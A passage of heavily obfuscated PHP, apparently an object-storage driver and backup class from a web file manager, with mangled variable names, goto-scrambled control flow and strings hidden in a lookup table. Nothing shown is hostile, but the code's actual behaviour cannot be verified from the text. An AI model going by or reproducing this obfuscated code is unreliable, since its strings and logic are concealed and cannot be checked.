$this->getPathOuter($Aä‰ÀÅó²Š[8] . $däŞ•í²‘ƒ), $Aä‰ÀÅó²Š[29] => $Aä‰ÀÅó²Š[76]); if ($fâ Ö’¡–Å) { return $cæ‰ê›â; } goto E©•ç«à¼; AÓ«©©¤õ°: $däŞ•í²‘ƒ = trim($däŞ•í²‘ƒ, $Aä‰ÀÅó²Š[8]) . $Aä‰ÀÅó²Š[8]; $F¤ÀŒö²ÑÎ = $this->objectMeta($däŞ•í²‘ƒ); if (isset($F¤ÀŒö²ÑÎ[$Aä‰ÀÅó²Š[195]])) { $cæ‰ê›â[$Aä‰ÀÅó²Š[192]] = $F¤ÀŒö²ÑÎ[$Aä‰ÀÅó²Š[195]]; } goto FÛíÁ¹¤†; E©•ç«à¼: $cæ‰ê›â[$Aä‰ÀÅó²Š[192]] = $cæ‰ê›â[$Aä‰ÀÅó²Š[83]] = 0; $cæ‰ê›â[$Aä‰ÀÅó²Š[193]] = $cæ‰ê›â[$Aä‰ÀÅó²Š[194]] = !0; if ($däŞ•í²‘ƒ == $Aä‰ÀÅó²Š[33]) { return $cæ‰ê›â; } goto AÓ«©©¤õ°; FÛíÁ¹¤†: return $cæ‰ê›â; goto cÈã•ºÜô; cÈã•ºÜô: } private function fileList($A³å§Ş¶ŞÀ, $C¸¹ËÄ‚ò = '', $EëöùƒŒÇÙ = 0) { goto dµÈ©ˆÖ; B‰‰íªŠğ: if (!$f‰”ÓÅ²±˜) { return array($F…¥õ˜â¿­[74] => array(), $F…¥õ˜â¿­[73] => array()); } $B¡‹“åÕ„ = $this->listItemCache === !1 ? !1 : !0; $f›š¸±ó÷ = $d”Í—Ê÷íË = array(); goto Eæ‹‡ºµé; D«Öƒ˜£Ú÷: return array($F…¥õ˜â¿­[74] => $f›š¸±ó÷, $F…¥õ˜â¿­[73] => $d”Í—Ê÷íË); goto C¿áîÏìŒŞ; Eæ‹‡ºµé: foreach ($f‰”ÓÅ²±˜[$F…¥õ˜â¿­[196]] as $F¿ƒ¿èæÇ§) { goto aƒ¹ˆ§ï÷Ñ; c•³èÇ”õ: $d”Í—Ê÷íË[] = $EëöùƒŒÇÙ ? $F¿ƒ¿èæÇ§ : $D¢±±ÙÎ; goto Dä··Ò×‡¨; eË‘›ğ×¦ˆ: $C°ö°Ô´§¹ = $D·íÏ˜µÆ == 0 && substr($D¢±±ÙÎ, strlen($D¢±±ÙÎ) - 1, 1) == $F…¥õ˜â¿­[8] ? !0 : !1; if ($B¡‹“åÕ„) { $this->cacheMethod($F…¥õ˜â¿­[197], $D¢±±ÙÎ, $C°ö°Ô´§¹); $this->cacheMethod($F…¥õ˜â¿­[198], $D¢±±ÙÎ, $F¿ƒ¿èæÇ§); } if ($C°ö°Ô´§¹) { $f›š¸±ó÷[] = $D¢±±ÙÎ; continue; } goto c•³èÇ”õ; aƒ¹ˆ§ï÷Ñ: $D¢±±ÙÎ = $F¿ƒ¿èæÇ§[$F…¥õ˜â¿­[28]]; if ($D¢±±ÙÎ == $Câõ³–’Ş×) { continue; } $D·íÏ˜µÆ = isset($F¿ƒ¿èæÇ§[$F…¥õ˜â¿­[77]]) ? $F¿ƒ¿èæÇ§[$F…¥õ˜â¿­[77]] : 0; goto eË‘›ğ×¦ˆ; Dä··Ò×‡¨: } foreach ($f‰”ÓÅ²±˜[$F…¥õ˜â¿­[199]] as $F¿ƒ¿èæÇ§) { $f›š¸±ó÷[] = $F¿ƒ¿èæÇ§[$F…¥õ˜â¿­[28]]; if ($B¡‹“åÕ„) { $this->cacheMethod($F…¥õ˜â¿­[197], $F¿ƒ¿èæÇ§[$F…¥õ˜â¿­[28]], !0); } } if ($B¡‹“åÕ„) { $this->cacheMethod($F…¥õ˜â¿­[197], $A³å§Ş¶ŞÀ, !0); } goto D«Öƒ˜£Ú÷; dµÈ©ˆÖ: $F…¥õ˜â¿­ =& $_SERVER[µ…]; $Câõ³–’Ş× = rtrim($A³å§Ş¶ŞÀ, $F…¥õ˜â¿­[8]) . $F…¥õ˜â¿­[8]; $f‰”ÓÅ²±˜ = $this->listObjs($Câõ³–’Ş×, null, null, $C¸¹ËÄ‚ò); goto B‰‰íªŠğ; C¿áîÏìŒŞ: } private function listObjs($f¯âé¦àÚ¾, $F‰¶Üöõ×± = null, $FÊïˆ¸İ¦Ş = null, $f—Ü±µÀà« = null) { $b³Ä‹§Ô =& $_SERVER[µ…]; $f¯âé¦àÚ¾ = trim($f¯âé¦àÚ¾, $b³Ä‹§Ô[8]); $B¬á·Ï½ = empty($f¯âé¦àÚ¾) ? $b³Ä‹§Ô[33] : $f¯âé¦àÚ¾ . $b³Ä‹§Ô[8]; return $this->client->getBucket($this->bucket, $B¬á·Ï½, $F‰¶Üöõ×±, $FÊïˆ¸İ¦Ş, $f—Ü±µÀà«, !0); } public function has($aãê¼í ÷, $c­™„Óïäƒ = false, $d‚éÑ‚Åœ = true) { goto a÷È§éàÊË; aÎŞß²î: return !1; goto fÎŞŞ¥é¹Ê; a÷È§éàÊË: $aÄÅåÎéâå =& $_SERVER[µ…]; $aãê¼í ÷ = trim($aãê¼í ÷, $aÄÅåÎéâå[8]); $Eñõèî‹¡Ä = empty($aãê¼í ÷) ? $aÄÅåÎéâå[33] : $aãê¼í ÷ . $aÄÅåÎéâå[8]; goto e›œÔ¤ÊÓØ; e›œÔ¤ÊÓØ: $DÃÑâÂµë = null; $eé¬ÁÅª«ë = 500; $C«ÄÌ¿Ö¯ª = $aÄÅåÎéâå[8]; goto Eğî¥ï¼‹¾; Eğî¥ï¼‹¾: $BïîæÑ÷„Ú = $Bä„éˆ¼½Š = array(); while (!0) { $cã‘œô = $this->listObjs($aãê¼í ÷, $DÃÑâÂµë, $eé¬ÁÅª«ë, $C«ÄÌ¿Ö¯ª); if (!$cã‘œô) { break; } $DÃÑâÂµë = $cã‘œô[$aÄÅåÎéâå[200]]; $CÖîŒ±‡¤ = $cã‘œô[$aÄÅåÎéâå[196]]; $F×ì°ˆ¥ñ£ = $cã‘œô[$aÄÅåÎéâå[199]]; if (empty($CÖîŒ±‡¤) && empty($F×ì°ˆ¥ñ£)) { break; } if (count($CÖîŒ±‡¤) == 1 && $CÖîŒ±‡¤[0][$aÄÅåÎéâå[28]] == $Eñõèî‹¡Ä) { break; } if ($c­™„Óïäƒ) { if (count($CÖîŒ±‡¤)) { $CÖîŒ±‡¤ = array_column($CÖîŒ±‡¤, $aÄÅåÎéâå[28]); $BïîæÑ÷„Ú = array_merge($BïîæÑ÷„Ú, $CÖîŒ±‡¤); } if (count($F×ì°ˆ¥ñ£)) { $F×ì°ˆ¥ñ£ = array_column($F×ì°ˆ¥ñ£, $aÄÅåÎéâå[28]); $Bä„éˆ¼½Š = array_merge($Bä„éˆ¼½Š, $F×ì°ˆ¥ñ£); } if ($DÃÑâÂµë === null) { break; } continue; } if ($d‚éÑ‚Åœ) { if (!empty($CÖîŒ±‡¤)) { if (count($CÖîŒ±‡¤) > 1 || isset($CÖîŒ±‡¤[0][$aÄÅåÎéâå[28]]) && $CÖîŒ±‡¤[0][$aÄÅåÎéâå[28]] != $Eñõèî‹¡Ä) { return !0; } } } else { if (!empty($F×ì°ˆ¥ñ£)) { return !0; } } if ($DÃÑâÂµë === null) { break; } } if ($c­™„Óïäƒ) { $BïîæÑ÷„Ú = array_diff($BïîæÑ÷„Ú, array($Eñõèî‹¡Ä)); $BïîæÑ÷„Ú = count(array_unique($BïîæÑ÷„Ú)); $Bä„éˆ¼½Š = count(array_unique($Bä„éˆ¼½Š)); return array($aÄÅåÎéâå[201] => $BïîæÑ÷„Ú, $aÄÅåÎéâå[202] => $Bä„éˆ¼½Š); } goto aÎŞß²î; fÎŞŞ¥é¹Ê: } public function listAll($e«‡ßŸì°) { $fíŸğ‡ˆ´ =& $_SERVER[µ…]; $EòéÁÄ›Õ½ = $this->fileList($e«‡ßŸì°, $fíŸğ‡ˆ´[33], !0); $Cå¡…Â¤—Ç = array(); foreach ($EòéÁÄ›Õ½[$fíŸğ‡ˆ´[73]] as $aÅØ¯´³×µ) { $Cå¡…Â¤—Ç[$aÅØ¯´³×µ[$fíŸğ‡ˆ´[28]]] = $aÅØ¯´³×µ[$fíŸğ‡ˆ´[77]]; } foreach ($EòéÁÄ›Õ½[$fíŸğ‡ˆ´[74]] as $aÅØ¯´³×µ) { if (is_string($aÅØ¯´³×µ)) { $Cå¡…Â¤—Ç[$aÅØ¯´³×µ] = 0; } } return $this->listAllFiles($e«‡ßŸì°, array_keys($Cå¡…Â¤—Ç), $Cå¡…Â¤—Ç); } public function canRead($cÅíÓãèÚ²) { $E­éÜ–ô‹Š =& $_SERVER[µ…]; $döÀ·¯Š‘Ñ = $this->client->getAccessControlPolicy($this->bucket, $cÅíÓãèÚ²); if (!$döÀ·¯Š‘Ñ) { return !1; } return in_array($döÀ·¯Š‘Ñ, array($E­éÜ–ô‹Š[203], $E­éÜ–ô‹Š[204], $E­éÜ–ô‹Š[205])) ? !0 : !1; } public function canWrite($F³ÛŞ’Ö) { $c±…Áˆ¼ÌŠ =& $_SERVER[µ…]; $aÅ¯„Ú = $this->client->getAccessControlPolicy($this->bucket, $F³ÛŞ’Ö); if (!$aÅ¯„Ú) { return !1; } return in_array($aÅ¯„Ú, array($c±…Áˆ¼ÌŠ[203], $c±…Áˆ¼ÌŠ[204])) ? !0 : !1; } public function getContent($E²òÖ½¬±í) { return $this->client->getObject($this->bucket, $E²òÖ½¬±í); } public function setContent($bí¯îÛß•¶, $fêïëÅ›”† = '', $DÙª¶È…†¾ = false) { goto EîŒ´ñö®„; DÛí †Òîñ: $this->cacheMethod(null, null); $e©ªãÓÏÊ = $this->copyFile($bí¯îÛß•¶, $bí¯îÛß•¶, array($aêÏùËŞÉ[206] => $e©ªãÓÏÊ[$aêÏùËŞÉ[207]])); return $e©ªãÓÏÊ ? !0 : !1; goto bîæ£Ø†öø; EîŒ´ñö®„: $aêÏùËŞÉ =& $_SERVER[µ…]; $bí¯îÛß•¶ = $DÙª¶È…†¾ ? trim($bí¯îÛß•¶, $aêÏùËŞÉ[8]) . $aêÏùËŞÉ[8] : $bí¯îÛß•¶; $B’¡¸¦ŸÈ¤ = get_file_mime(get_path_ext($bí¯îÛß•¶)); goto dæÄòö²İ; dæÄòö²İ: $e©ªãÓÏÊ = $this->client->putObject($fêïëÅ›”†, $this->bucket, $bí¯îÛß•¶, $aêÏùËŞÉ[190], array(), $B’¡¸¦ŸÈ¤); if (!$e©ªãÓÏÊ) { return !1; } if ($DÙª¶È…†¾) { return !0; } goto DÛí †Òîñ; bîæ£Ø†öø: } public function fileSubstr($bº¥œ”Ö, $A¥Ü‘ÄÅÊ, $c‰‰¬ŒÒŒ) { $c›¡ĞŒµÈ¤ = $A¥Ü‘ÄÅÊ + $c‰‰¬ŒÒŒ - 1; return $this->client->getObject($this->bucket, $bº¥œ”Ö, array($_SERVER[µ…][208] => "\x62\171\164\x65\x73\x3d{$A¥Ü‘ÄÅÊ}\55{$c›¡ĞŒµÈ¤}")); } public function upload($aøËàÇ©²Î, $D¬ÙÙÇâ¾, $Bìô‘ğ©æ¤ = false, $bÍôß…ºùß = REPEAT_REPLACE) { $eÏ¦¹»µ¤ñ =& $_SERVER[µ…]; $cáœ…Ÿùƒ‚ = array($eÏ¦¹»µ¤ñ[206] => @md5_file($D¬ÙÙÇâ¾)); $eÁ„ÕäÈ† = array($eÏ¦¹»µ¤ñ[209] => get_file_mime(get_path_ext($aøËàÇ©²Î))); if (IO::size($D¬ÙÙÇâ¾) <= 1024 * 1024 * 200) { $B®œ·÷ôÙå = $this->client->putObjectFile($D¬ÙÙÇâ¾, $this->bucket, $aøËàÇ©²Î, $eÏ¦¹»µ¤ñ[190], $cáœ…Ÿùƒ‚, $eÁ„ÕäÈ†); return !empty($B®œ·÷ôÙå) ? $this->getPathOuter($aøËàÇ©²Î) : !1; } $a§çä¼ÔÂ¤ = $this->client->multiUploadObject($D¬ÙÙÇâ¾, $this->bucket, trim($aøËàÇ©²Î, $eÏ¦¹»µ¤ñ[8]), $cáœ…Ÿùƒ‚, $eÁ„ÕäÈ†); return $a§çä¼ÔÂ¤ ? $this->getPathOuter($aøËàÇ©²Î) : !1; } public function download($CºÀÑ¥ÈÒ†, $F‡§ƒÒÇÏ) { if (!@is_dir($this->pathFather($F‡§ƒÒÇÏ)) && !IO::mkdir($this->pathFather($F‡§ƒÒÇÏ))) { return !1; } $c½áÖ…©åÊ = $this->client->getObject($this->bucket, $CºÀÑ¥ÈÒ†, array(), $F‡§ƒÒÇÏ); return $c½áÖ…©åÊ !== !1 ? $F‡§ƒÒÇÏ : !1; } public function link($B±½¸‘ô, $e ©äÙë ƒ = array()) { $Eá¾¬Ñß ª =& $_SERVER[µ…]; if ($this->signVer == $Eá¾¬Ñß ª[210]) { return $this->client->getAuthenticatedURL($this->bucket, $B±½¸‘ô, 3600 * 12, $e ©äÙë ƒ); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($B±½¸‘ô, $Eá¾¬Ñß ª[8]), 3600 * 12, $this->region, array(), !0, $e ©äÙë ƒ); } public function fileOut($F™æÅ‰—, $b—Ó÷…–ö = false, $fİ·ôœª£ = false, $aÀŠâÛê‚ = '') { goto b“Æ¹Ù´³İ; b“Æ¹Ù´³İ: $bÊ‘»Îƒ‡¬ =& $_SERVER[µ…]; if ($this->isFileOutServer()) { return $this->fileOutServer($F™æÅ‰—, $b—Ó÷…–ö, $fİ·ôœª£, $aÀŠâÛê‚); } if (!$fİ·ôœª£) { $fİ·ôœª£ = $this->pathThis($F™æÅ‰—); } goto F‰À”ôÛ·; cÏöáòÊÍ½: $A»Î‹¥»ê = array($bÊ‘»Îƒ‡¬[214] => $b—Ó÷…–ö . $bÊ‘»Îƒ‡¬[215] . rawurlencode($fİ·ôœª£), $bÊ‘»Îƒ‡¬[216] => $d¦ƒ¬º¹©À); $eË„Î›Ìé = $this->link($F™æÅ‰—, $A»Î‹¥»ê); $this->fileOutLink($eË„Î›Ìé); goto CíìÃ¼´´; F‰À”ôÛ·: $d¦ƒ¬º¹©À = get_file_mime(get_path_ext($fİ·ôœª£)); if ($d¦ƒ¬º¹©À == $bÊ‘»Îƒ‡¬[211]) { return parent::fileOut($F™æÅ‰—, $b—Ó÷…–ö, $fİ·ôœª£, $aÀŠâÛê‚); } $b—Ó÷…–ö = $b—Ó÷…–ö ? $bÊ‘»Îƒ‡¬[212] : $bÊ‘»Îƒ‡¬[213]; goto cÏöáòÊÍ½; CíìÃ¼´´: } public function fileOutServer($B ©¶Ø‹, $bÛ‘ØÎÂ‰ = false, $Aâ‹ƒí°ï = false, $e–ˆöôÜÁ– = '') { parent::fileOut($B ©¶Ø‹, $bÛ‘ØÎÂ‰, $Aâ‹ƒí°ï, $e–ˆöôÜÁ–); } public function fileOutImageServer($eÓƒ†Ò¡Â¤, $aï°ŸÔ¥¡Œ = 250) { parent::fileOutImage($eÓƒ†Ò¡Â¤, $aï°ŸÔ¥¡Œ); } public function hashMd5($dÂÛëÚ®ãæ, $bîèÉ°ˆä = '') { $d„Ô®ğ¡‡ =& $_SERVER[µ…]; $F…–Ê¸ãÖ = $this->objectMeta($dÂÛëÚ®ãæ); if (!$F…–Ê¸ãÖ) { return !1; } $bîèÉ°ˆä = $bîèÉ°ˆä ? $bîèÉ°ˆä : _get($F…–Ê¸ãÖ, $d„Ô®ğ¡‡[217]); $bîèÉ°ˆä = $bîèÉ°ˆä ? $bîèÉ°ˆä : _get($F…–Ê¸ãÖ, $d„Ô®ğ¡‡[207], $d„Ô®ğ¡‡[33]); return $bîèÉ°ˆä; } public function uploadFormData($EÍÎÚİÁ“ç, $e·Ãç™°‰‡ = 3600) { $Eƒ‰‰¡¢§¡ =& $_SERVER[µ…]; $cÒç°øäèÉ = $this->pathFather($EÍÎÚİÁ“ç); $Còâëß×Üª = $this->client->getHttpUploadPostParams($this->bucket, $cÒç°øäèÉ, $Eƒ‰‰¡¢§¡[190], $e·Ãç™°‰‡); return array_merge((array) $Còâëß×Üª, array($Eƒ‰‰¡¢§¡[174] => $this->getHost())); } public function multiUploadFormData($C±‰†²×Ò¹, $EŒ¹×«»¾ = 3600) { $E¿‰ÈÑÀÃÛ =& $_SERVER[µ…]; $e…ÛóÃ×ÏŸ = gmdate($E¿‰ÈÑÀÃÛ[218]); $a›·ß¨º£ù = array(); $EùÄ•Ç‰± = $this->client->getUploadId($this->bucket, $C±‰†²×Ò¹, $a›·ß¨º£ù); if (!$EùÄ•Ç‰±) { return !1; } return array($E¿‰ÈÑÀÃÛ[219] => $EùÄ•Ç‰±, $E¿‰ÈÑÀÃÛ[174] => $this->getHost() . $E¿‰ÈÑÀÃÛ[8] . $this->pathEncode($C±‰†²×Ò¹), $E¿‰ÈÑÀÃÛ[220] => $e…ÛóÃ×ÏŸ, $E¿‰ÈÑÀÃÛ[92] => $C±‰†²×Ò¹); } public function multiUploadAuthData($Bã²†Ëîá, $AóÙ—†ÃÆË = array()) { goto Fïí–‚¥; Fïí–‚¥: $EÃ‹ƒÑ‡Œ =& $_SERVER[µ…]; $f¡À—Ì¥ŸÏ = isset($AóÙ—†ÃÆË[$EÃ‹ƒÑ‡Œ[220]]) ? $AóÙ—†ÃÆË[$EÃ‹ƒÑ‡Œ[220]] : gmdate($EÃ‹ƒÑ‡Œ[218]); $Aéİğ²—Æ = isset($AóÙ—†ÃÆË[$EÃ‹ƒÑ‡Œ[167]]) ? $AóÙ—†ÃÆË[$EÃ‹ƒÑ‡Œ[167]] : $EÃ‹ƒÑ‡Œ[33]; goto fíáÙÛ«òŠ; EÆèâ‰–Ù·: $E‹Ó‰Å¤¯ = array($EÃ‹ƒÑ‡Œ[222], $EÃ‹ƒÑ‡Œ[33], $EÃ‹ƒÑ‡Œ[118], $EÃ‹ƒÑ‡Œ[33], "\170\x2d\141\x6d\x7a\55\144\141\164\x65\x3a{$f¡À—Ì¥ŸÏ}", $EÃ‹ƒÑ‡Œ[8] . $this->bucket . $EÃ‹ƒÑ‡Œ[8] . $this->pathEncode($f´âøÔêÒŠ) . $Aéİğ²—Æ); if (strpos($Aéİğ²—Æ, $EÃ‹ƒÑ‡Œ[223]) === 0) { $E‹Ó‰Å¤¯[0] = $EÃ‹ƒÑ‡Œ[224]; } if (isset($AóÙ—†ÃÆË[$EÃ‹ƒÑ‡Œ[225]]) && $AóÙ—†ÃÆË[$EÃ‹ƒÑ‡Œ[225]] == $EÃ‹ƒÑ‡Œ[226]) { $E‹Ó‰Å¤¯[0] = $EÃ‹ƒÑ‡Œ[226]; } goto cšÇ±»¶…„; fíáÙÛ«òŠ: $f´âøÔêÒŠ = $AóÙ—†ÃÆË[$EÃ‹ƒÑ‡Œ[92]]; unset($AóÙ—†ÃÆË[$EÃ‹ƒÑ‡Œ[92]]); if (isset($AóÙ—†ÃÆË[$EÃ‹ƒÑ‡Œ[221]])) { $AóÙ—†ÃÆË[$EÃ‹ƒÑ‡Œ[220]] = $f¡À—Ì¥ŸÏ; return $this->listUploadParts($f´âøÔêÒŠ, $AóÙ—†ÃÆË); } goto EÆèâ‰–Ù·; AãÆ…×ğˆ: if (strpos($Aéİğ²—Æ, $EÃ‹ƒÑ‡Œ[223]) === 0) { return array($EÃ‹ƒÑ‡Œ[230] => $d‹ìÆÊ±¦, $EÃ‹ƒÑ‡Œ[220] => $f¡À—Ì¥ŸÏ); } return $d‹ìÆÊ±¦; goto fæ¿åÒõ’; cšÇ±»¶…„: $CÎÂ×ŠĞ¨‰ = implode($EÃ‹ƒÑ‡Œ[227], $E‹Ó‰Å¤¯); $CÏØ¶´º  = base64_encode(hash_hmac($EÃ‹ƒÑ‡Œ[228], $CÎÂ×ŠĞ¨‰, $this->secret, !0)); $d‹ìÆÊ±¦ = $EÃ‹ƒÑ‡Œ[229] . $this->accessKey . $EÃ‹ƒÑ‡Œ[4] . $CÏØ¶´º ; goto AãÆ…×ğˆ; fæ¿åÒõ’: } public function listUploadParts($a÷ªÙ¹å ê, $b£¥†ëƒœŞ = array()) { goto B…í¶èóÁ; cºéÄÔ‡Êè: if (!$fóÃ…ËËóÏ) { return !1; } unset($b£¥†ëƒœŞ[$DÌÓÜßÔ¶İ[221]], $b£¥†ëƒœŞ[$DÌÓÜßÔ¶İ[225]]); $b£¥†ëƒœŞ[$DÌÓÜßÔ¶İ[92]] = $a÷ªÙ¹å ê; goto A–‹õ´ÇÅ²; B…í¶èóÁ: $DÌÓÜßÔ¶İ =& $_SERVER[µ…]; $EÆ™äË¶š = str_replace($DÌÓÜßÔ¶İ[231], $DÌÓÜßÔ¶İ[33], $b£¥†ëƒœŞ[$DÌÓÜßÔ¶İ[167]]); $fóÃ…ËËóÏ = $this->client->listParts($this->bucket, $a÷ªÙ¹å ê, $EÆ™äË¶š); goto cºéÄÔ‡Êè; A–‹õ´ÇÅ²: $eË¬Ò—©Á° = $this->multiUploadAuthData($a÷ªÙ¹å ê, $b£¥†ëƒœŞ); if (empty($eË¬Ò—©Á°)) { return !1; } return array($DÌÓÜßÔ¶İ[230] => $eË¬Ò—©Á°, $DÌÓÜßÔ¶İ[220] => $b£¥†ëƒœŞ[$DÌÓÜßÔ¶İ[220]], $DÌÓÜßÔ¶İ[232] => $fóÃ…ËËóÏ); goto Fˆ³£¿¬ÏÂ; Fˆ³£¿¬ÏÂ: } public function getHost() { return parent::getHost() . $_SERVER[µ…][8] . $this->bucket; } public function size($B®’¹Êô¿Ø) { $FÅá…Š‹œÇ = $this->objectMeta($B®’¹Êô¿Ø); return $FÅá…Š‹œÇ ? $FÅá…Š‹œÇ[$_SERVER[µ…][77]] : 0; } public function info($FÀ¹«„ãßô) { if ($this->isFolder($FÀ¹«„ãßô)) { return $this->folderInfo($FÀ¹«„ãßô); } else { if ($this->isFile($FÀ¹«„ãßô)) { return $this->fileInfo($FÀ¹«„ãßô); } } return !1; } public function exist($aí†ì’ñª¿) { return $this->isFile($aí†ì’ñª¿) || $this->isFolder($aí†ì’ñª¿); } public function isFile($EñÎ­ëò£…) { return !$this->isFolder($EñÎ­ëò£…) && $this->objectMeta($EñÎ­ëò£…); } public function isFolder($bÉ°Æ©Ãœ…) { return $this->cacheMethod($_SERVER[µ…][197], $bÉ°Æ©Ãœ…); } protected function objectMeta($BÖ†ÅğŠÊ) { return $this->cacheMethod($_SERVER[µ…][198], $BÖ†ÅğŠÊ); } protected function _objectMeta($E†ß½ó‘¥) { $C¿Îœº‡†‰ =& $_SERVER[µ…]; $E†ß½ó‘¥ = rtrim($E†ß½ó‘¥, $C¿Îœº‡†‰[8]); try { $e´Ÿ¿”ç¨  = $this->client->getObjectInfo($this->bucket, $E†ß½ó‘¥); if (!isset($e´Ÿ¿”ç¨ [$C¿Îœº‡†‰[217]]) && isset($e´Ÿ¿”ç¨ [$C¿Îœº‡†‰[233]])) { $e´Ÿ¿”ç¨ [$C¿Îœº‡†‰[217]] = $e´Ÿ¿”ç¨ [$C¿Îœº‡†‰[233]]; } } catch (Exception $bãöê‡Çê) { $e´Ÿ¿”ç¨  = !1; } if (!$e´Ÿ¿”ç¨ ) { } return $e´Ÿ¿”ç¨ ; } protected function _isFolder($f„’‰ƒ„“Ò) { goto Cáöƒî¨‡õ; Cáöƒî¨‡õ: $bğâÏÛ¾½ó =& $_SERVER[µ…]; $f„’‰ƒ„“Ò = rtrim($f„’‰ƒ„“Ò, $bğâÏÛ¾½ó[8]); if ($f„’‰ƒ„“Ò == $bğâÏÛ¾½ó[33] || $f„’‰ƒ„“Ò == $bğâÏÛ¾½ó[8]) { return !0; } goto AÆó†øï™ˆ; AÆó†øï™ˆ: $cé¹ùÑ×›§ = $this->client->getBucket($this->bucket, $f„’‰ƒ„“Ò, null, 1); if (empty($cé¹ùÑ×›§[$bğâÏÛ¾½ó[196]])) { return !1; } $FÜ÷¦¥ÈÏÈ = $cé¹ùÑ×›§[$bğâÏÛ¾½ó[196]][0][$bğâÏÛ¾½ó[28]]; goto F»Š“¶·ë¢; F»Š“¶·ë¢: if (substr($FÜ÷¦¥ÈÏÈ, -1) == $bğâÏÛ¾½ó[8]) { return !0; } if (get_path_this($FÜ÷¦¥ÈÏÈ) == get_path_this($f„’‰ƒ„“Ò)) { return !1; } return !0; goto FÃÄ¢Ú‰ä; FÃÄ¢Ú‰ä: } } define($_SERVER[µ…][234], 1); goto Cˆˆ“åÉ›; bÚá÷èà†š: class Backup { protected static $name; protected static $option; public function __construct() { $this->init(); } public function init() { $DÃ¾ğ”àœ¸ =& $_SERVER[µ…]; self::$name = date($DÃ¾ğ”àœ¸[702]); if (!($d„±‡»ˆˆŠ = Model($DÃ¾ğ”àœ¸[703])->lastItem())) { $d„±‡»ˆˆŠ = $this->initData(); } else { self::$name = $d„±‡»ˆˆŠ[$DÃ¾ğ”àœ¸[28]]; if ($d„±‡»ˆˆŠ[$DÃ¾ğ”àœ¸[704]] == $DÃ¾ğ”àœ¸[86]) { self::$name = date($DÃ¾ğ”àœ¸[705]); $AíïßÉë¡ = 0; if (isset($d„±‡»ˆˆŠ[$DÃ¾ğ”àœ¸[289]][$DÃ¾ğ”àœ¸[191]][$DÃ¾ğ”àœ¸[441]])) { $AíïßÉë¡ = (int) $d„±‡»ˆˆŠ[$DÃ¾ğ”àœ¸[289]][$DÃ¾ğ”àœ¸[191]][$DÃ¾ğ”àœ¸[441]]; } if ($d„±‡»ˆˆŠ[$DÃ¾ğ”àœ¸[28]] == self::$name) { Model($DÃ¾ğ”àœ¸[703])->remove($d„±‡»ˆˆŠ[$DÃ¾ğ”àœ¸[388]]); } $d„±‡»ˆˆŠ = $this->initData($AíïßÉë¡, $d„±‡»ˆˆŠ[$DÃ¾ğ”àœ¸[706]]); } else { $this->checkStore($d„±‡»ˆˆŠ[$DÃ¾ğ”àœ¸[706]]); } } self::$option = $d„±‡»ˆˆŠ; } private function initData($AáÕ‰ÕùŸ = 0, $D–§Ôß×»  = '') { goto AÉÙ„…¹–õ; DÚà‚ê: $this->checkStore($CŸöØâ´®‘[$DÙ‹ÑëÏ[706]]); $b¨½Â×ƒœò = array($DÙ‹ÑëÏ[706] => $CŸöØâ´®‘[$DÙ‹ÑëÏ[706]], $DÙ‹ÑëÏ[28] => self::$name, $DÙ‹ÑëÏ[704] => 0, $DÙ‹ÑëÏ[707] => $CŸöØâ´®‘[$DÙ‹ÑëÏ[707]], $DÙ‹ÑëÏ[289] => array($DÙ‹ÑëÏ[708] => array($DÙ‹ÑëÏ[704] => 0), $DÙ‹ÑëÏ[709] => array($DÙ‹ÑëÏ[704] => 0, $DÙ‹ÑëÏ[710] => 0, $DÙ‹ÑëÏ[711] => 0, $DÙ‹ÑëÏ[29] => $DÙ‹ÑëÏ[33]), $DÙ‹ÑëÏ[712] => array($DÙ‹ÑëÏ[704] => 0, $DÙ‹ÑëÏ[710] => 0, $DÙ‹ÑëÏ[711] => 0), $DÙ‹ÑëÏ[191] => array($DÙ‹ÑëÏ[704] => 0, $DÙ‹ÑëÏ[713] => 0, $DÙ‹ÑëÏ[714] => 0, $DÙ‹ÑëÏ[715] => 0, $DÙ‹ÑëÏ[716] => 0, $DÙ‹ÑëÏ[441] => $AáÕ‰ÕùŸ)), $DÙ‹ÑëÏ[717] => time(), $DÙ‹ÑëÏ[470] => 0); $b¨ëÆ¾†Ò  = Model($DÙ‹ÑëÏ[703])->insert($b¨½Â×ƒœò); goto d”®ÍÚ©ßƒ; d”®ÍÚ©ßƒ: $b¨½Â×ƒœò[$DÙ‹ÑëÏ[388]] = $b¨ëÆ¾†Ò ; return $b¨½Â×ƒœò; goto b„«‚™’äô; AÉÙ„…¹–õ: $DÙ‹ÑëÏ =& $_SERVER[µ…]; $CŸöØâ´®‘ = Model($DÙ‹ÑëÏ[703])->config(); if ($D–§Ôß×»  && $CŸöØâ´®‘[$DÙ‹ÑëÏ[706]] != $D–§Ôß×» ) { $AáÕ‰ÕùŸ = 0; } goto DÚà‚ê; b„«‚™’äô: } private function checkStore($Aø”Ò“««) { $aÊŸÁó„ë =& $_SERVER[µ…]; $D‰õÎÜÒŞ = Model($aÊŸÁó„ë[718])->listData($Aø”Ò“««); Model($aÊŸÁó„ë[718])->checkConfig($D‰õÎÜÒŞ); } public static function get() { if (!self::$option) { self::$option = Model($_SERVER[µ…][703])->findByName(self::$name); } return self::$option; } public static function set($bÔÅÇŸ™‚±) { $A¥³™Â =& $_SERVER[µ…]; $d‘…Àª ÛÛ = self::get(); foreach ($bÔÅÇŸ™‚± as $cØÕ—åãŸ => $f¼‚¡‡šà‡) { $c¯²¨±ÅÒ = explode($A¥³™Â[94], $cØÕ—åãŸ); $C–œ©ğÛ¬ = count($c¯²¨±ÅÒ); switch ($C–œ©ğÛ¬) { case 1: $d‘…Àª ÛÛ[$c¯²¨±ÅÒ[0]] = $f¼‚¡‡šà‡; break; case 2: $d‘…Àª ÛÛ[$c¯²¨±ÅÒ[0]][$c¯²¨±ÅÒ[1]] = $f¼‚¡‡šà‡; break; case 3: $d‘…Àª ÛÛ[$c¯²¨±ÅÒ[0]][$c¯²¨±ÅÒ[1]][$c¯²¨±ÅÒ[2]] = $f¼‚¡‡šà‡; break; } } Model($A¥³™Â[703])->update($d‘…Àª ÛÛ[$A¥³™Â[388]], $d‘…Àª ÛÛ); self::$option = $d‘…Àª ÛÛ; return self::$option; } public function keep() { $bßÄó¡ßÚ° =& $_SERVER[µ…]; $bŸ˜¹ìÇš = self::get(); if ($bŸ˜¹ìÇš[$bßÄó¡ßÚ°[289]][$bßÄó¡ßÚ°[708]][$bßÄó¡ßÚ°[704]] == $bßÄó¡ßÚ°[86]) { return; } $this->backupKeep($bŸ˜¹ìÇš); self::set(array($bßÄó¡ßÚ°[719] => 1)); } private function 